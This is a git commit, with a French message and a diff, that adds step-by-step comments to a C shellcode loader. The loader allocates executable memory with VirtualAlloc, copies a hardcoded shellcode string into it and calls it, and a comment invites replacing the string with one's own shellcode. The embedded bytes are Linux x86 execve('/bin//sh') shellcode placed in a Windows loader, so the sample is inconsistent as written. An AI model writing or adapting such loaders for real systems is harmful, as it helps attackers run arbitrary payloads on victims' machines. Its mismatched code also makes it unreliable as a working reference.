67eae029e2aadd9d6abaff2f1fe12914a9ec39b7
Potite_Bulle <135218431+PotiteBulle@users.noreply.github.com>
2025-02-07 21:20:12 +0100

    feat: ajout du fichier loader.c pour charger et exécuter des shellcodes
    - Chargement de shellcode en mémoire avec VirtualAlloc.
    - Copie du shellcode dans la mémoire allouée.
    - Exécution du shellcode dans un environnement Windows.
    - Ajout de commentaires détaillés pour expliquer chaque étape.

--- ShellcodeLoader/loader.c
+++ ShellcodeLoader/loader.c
@@ -4,15 +4,20 @@
 #include <windows.h>
 
 int main() {
-    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; // Remplacez par votre shellcode
+    // Shellcode à exécuter (remplacez par votre propre shellcode)
+    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
+    // Allocation de mémoire pour le shellcode
     void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (exec == NULL) {
         printf("VirtualAlloc failed\n");
         return 1;
     }
 
+    // Copie du shellcode dans la mémoire allouée
     memcpy(exec, shellcode, sizeof(shellcode));
+
+    // Exécution du shellcode
     ((void(*)())exec)();
 
     return 0;
